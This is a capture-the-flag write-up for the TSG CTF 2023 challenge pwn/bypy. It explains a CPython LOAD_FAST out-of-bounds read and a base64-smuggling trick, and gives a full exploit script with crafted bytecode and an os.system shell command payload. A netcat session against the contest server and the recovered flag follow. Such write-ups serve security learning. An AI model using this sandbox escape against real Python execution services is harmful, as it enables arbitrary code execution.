# TSG CTF 2023 - pwn/bypy

- 4 solves / 393 pts
- Author: moratorium08

CPython has out-of-bounds read on LOAD_FAST, so you can get `exec` function through it.

You can also get `src` variable that you sent as a payload encoded base64. 

`base64.b64decode` function ignores non-base64 character, so you can hide the python code into your base64 payload.

I made bytecode that execute `exec(src)` to get shell.

## Exploit

```python
from opcode import opmap, cmp_op, _nb_ops
import dis
import types
import os
import sys
import marshal
from base64 import b64encode, b64decode


code = b""
code += bytes([opmap["LOAD_FAST"], 18])  # "src" variable
code += bytes([opmap["LOAD_FAST"], 51])  # exec function
code += bytes([opmap["LOAD_FAST"], 18])  # "src" variable
code += bytes([opmap["CALL"], 0]) + bytes([0] * 6)  # I don't know why this works well
code += bytes([opmap["RETURN_VALUE"], 0])

# print(code, file=sys.stderr)

codeobj = types.CodeType(0, 0, 0, 0, 0, 0, code, (), (), (), '', '', '', 0, b'', b'', (), ())

encoded = b64encode(marshal.dumps(codeobj)).decode()

for i in range(4):
    try:
        code = "\"" + encoded + "\";print(__loader__.exec_module.__globals__['sys'].modules['os'].system('cat flag*'));#" + "A" * i
        b64decode(code.encode())
    except Exception as e:
        print(e)
        continue
    print(code)

# "4wAAAAAAAAAAAAAAAAAAAAAAAAAA8xAAAAB8EnwzfBKrAAAAAAAAAAAAqQByAgAAAHICAAAA8wAAAADaAHIEAAAAcgQAAAAAAAAAcgMAAAByAwAAAA==";print(__loader__.exec_module.__globals__['sys'].modules['os'].system('cat flag*'));#
```

```
$ nc 34.146.195.242 40003
Give me your source:
"4wAAAAAAAAAAAAAAAAAAAAAAAAAA8xAAAAB8EnwzfBKrAAAAAAAAAAAAqQByAgAAAHICAAAA8wAAAADaAHIEAAAAcgQAAAAAAAAAcgMAAAByAwAAAA==";print(__loader__.exec_module.__globals__['sys'].modules['os'].system('cat flag*'));#
TSGCTF{our_caffeine_knight_slays_python_bytes}
0
Traceback (most recent call last):
  File "/home/user/executor.py", line 49, in <module>
  File "/home/user/executor.py", line 46, in main
SystemError: error return without exception set
```

## Flag

```
TSGCTF{our_caffeine_knight_slays_python_bytes}
```
